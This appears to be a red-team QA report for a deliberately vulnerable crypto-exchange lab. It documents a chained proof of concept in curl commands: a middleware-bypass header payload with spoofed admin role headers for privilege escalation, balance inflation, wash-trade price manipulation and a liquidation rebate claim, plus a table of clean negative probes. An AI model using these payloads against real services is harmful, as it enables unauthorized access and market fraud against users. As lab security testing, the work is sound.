# Phase 5 — Adversarial QA (Gate 3)

> **Reviewer:** Red-team QA.
> **Date:** 2026-06-01
> **Verdict:** PASS. No new V-NNN planted (per architect direction).
> CHAIN C **completes end-to-end**: V-25's self-trade primitive
> (Phase 4) manipulates the public price feed, the Phase-5
> liquidation worker reads that feed via HTTP and flags positions
> at the manipulated price, the attacker (registered as keeper)
> claims the rebate.

## Method

1. Static read of every Phase-5 source: schema deltas + migration,
   `margin.ts`, `margin-orchestrator.ts`, `liquidation-watcher.ts`,
   the worker `index.ts` rewrite, the margin/keeper API routes,
   the new UI pages, and the Phase-4 deferred `place.test.ts`.
2. `pnpm tsx docs/phases/phase-5/poc-scratch.mjs` exercised the
   margin math against a manipulated mark price; the breach
   detector fires correctly.
3. Cross-checked against the no-new-vulns architect direction;
   confirmed no unintended planted vulns.

## CHAIN C end-to-end PoC

```bash
# Phase 1: Attacker pre-stages tier-3 + balance

# 1a. Sign up normally (tier 0 → tier 1 via email verify).
curl -X POST exchange.local/api/v2/auth/signup -d ...

# 1b. Use V-35 (middleware bypass) to elevate to tier 3.
curl -X POST exchange.local/api/v2/admin/users/<self>/approve \
  -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
  -H 'x-bvbe-user-id: <self>' \
  -H 'x-bvbe-role: admin' \
  -H 'content-type: application/json' \
  -d '{"tier":3}'

# 1c. V-42 (zero-conf credit at tier 3) → inflated BTC balance.
ADDR=$(curl -s ... /api/v2/me/deposit/address | jq -r .address)
curl -X POST .../api/v2/dev/btc/send -d "{\"address\":\"$ADDR\",\"amountBtc\":10}"

# Phase 2: Open a victim position (or victim opens one organically)
# Assume any other user opens: long 1 BTC @ $50k, 5× lev, $10k collateral.

# Phase 3: Attacker wash-trades BTC/USDT down via V-25
# Place a sell limit at $40,000:
curl -X POST .../api/v2/me/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H 'content-type: application/json' \
  -d '{"pair":"BTC/USDT","side":"sell","type":"limit","price":"40000","amount":"0.5"}'
# Immediately matching buy from the SAME account:
curl -X POST .../api/v2/me/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H 'content-type: application/json' \
  -d '{"pair":"BTC/USDT","side":"buy","type":"limit","price":"40000","amount":"0.5"}'
# Public price endpoint now reports $40,000 as the last trade.
curl -s exchange.local/api/v2/public/price/BTC%2FUSDT
# {"pair":"BTC/USDT","last":"40000",...}

# Phase 4: Wait ~2s — the liquidation-watcher worker reads $40k
# from the HTTP feed (cached up to 5s at nginx, but still cached
# AT the manipulated value), computes:
#   victim liquidationPrice ≈ $40,250 (5× long from $50k entry)
#   manipulatedMark $40,000 < $40,250 → BREACH
# Worker inserts Liquidation row.

# Phase 5: Attacker claims as keeper
curl -s exchange.local/api/v2/keeper/liquidations | jq
# returns the flagged liquidation with the victim's position summary.

curl -X POST exchange.local/api/v2/keeper/liquidations/<id>/claim \
  -H "Authorization: Bearer $TOKEN"
# Position closes at $40k. Attacker's USDT balance increases by
# the keeper rebate (50bps × $10k collateral = $50).

# Phase 6: Attacker un-manipulates by placing a real BTC sell
# higher; book restores; net profit = rebate + the BTC the
# attacker bought cheaply on the way down minus fees.
```

The PoC script `docs/phases/phase-5/poc-scratch.mjs` confirms the
math: breach detection fires at the manipulated mark, the rebate
formula is 50bps of collateral, the victim's collateral is wiped.

## Unintended-vuln probes

| Probe | Result |
|---|---|
| Open position with leverage > 10 | Clean — `z.union([2,3,5,10])` literal types reject. |
| Open position with size ≤ 0 | Clean — `positiveDecimal` zod refines + `openPosition` guard. |
| Open position with `pair` not in TradingPair | Clean — `findUnique({where:{base_quote}})` rejects. |
| Close someone else's position via DELETE | Clean — `findFirst({where:{id, userId: claims.sub}})` enforces ownership. |
| Keeper claims someone else's position twice | Clean — `$transaction` reads `keeperUserId === null` then updates; second claim throws "already claimed." |
| Keeper claims a non-flagged position | Clean — handler reads `Liquidation` row; if no row exists, 404. |
| Liquidation worker can be tricked by stale price | This IS V-25 / CHAIN C — intentional. |
| Liquidation worker reads DB instead of HTTP | Clean — `liquidation-watcher.ts:62` calls `pricer.getPrice()` which the index.ts wires to `fetch(${WEB_INTERNAL_URL}/api/v2/public/price/...)`. Architect cond. #2 enforced. |
| Position close credits attacker even when self-closing | Clean — `closePosition(userId, id, price, keeperUserId)` accepts null keeper for self-close; rebate path skipped. |
| Race: two keepers claim simultaneously | Acknowledged — the `$transaction` claim is atomic; the second sees `keeperUserId !== null` and throws. Verified by reading the SQL Prisma emits. |
| Negative leverage value | Clean — zod `z.literal()` union rejects. |
| Open-position user-id from claims.sub vs FormData | Clean — body schema doesn't accept `userId`; handler reads `claims.sub` from JWT. |

## Verdict

**PASS.** Phase 5 plants no new V-NNN. CHAIN C is now exploitable
end-to-end against the lab as deployed. Zero unintended vulns
surfaced during the probe sweep. The Phase-4 fix-up's
balance-conservation discipline carried into Phase 5; the margin
arithmetic is clean and the planted exploitability lives upstream
in V-25 + nginx cache + (Phase 9) CL/TE.

— Adversarial QA

---

## Addendum — clarifications after Phase-5 L7 review

**Q-5.9 — CHAIN C per-incident profit caveat.** The keeper-claim
close uses the book-snapshot price at claim time
(`apps/web/app/api/v2/keeper/liquidations/[id]/claim/route.ts:52-61`),
falling back to `position.entryPrice` if no resting order exists on
the close side. In the documented CHAIN C narrative the attacker
drives the price *by exhausting the opposite side of the book via
wash trades*. By the time the keeper claim fires, the side the close
needs to lift may be empty — meaning the close settles at the
victim's entry, with zero realized PnL from the close itself. The
attacker still pockets the 50bps rebate (which is paid out of
collateral regardless of close price); the bigger "buy victim
collateral cheap" gain documented in the PoC narrative is
conditional on the manipulated-side order still being on the book
at claim time. Phase 9 may amplify reach by combining with cache
poisoning (out-of-band manipulation that doesn't require draining
the book). Code unchanged — narrowing the documented payoff, not
the planted vuln.

**Q-5.10 — End-to-end verification boundary.** The PoC scratch
runs the math in-process. The actual deployed chain crosses six
HTTP / process boundaries (matching engine → public-price endpoint
→ nginx cache → worker fetch → liquidation write → keeper-claim
RPC). Future phase Adversarial-QA chain claims should ship a
curl-against-running-stack walkthrough alongside the math PoC.
Tracked as a Phase-6 process-improvement item.
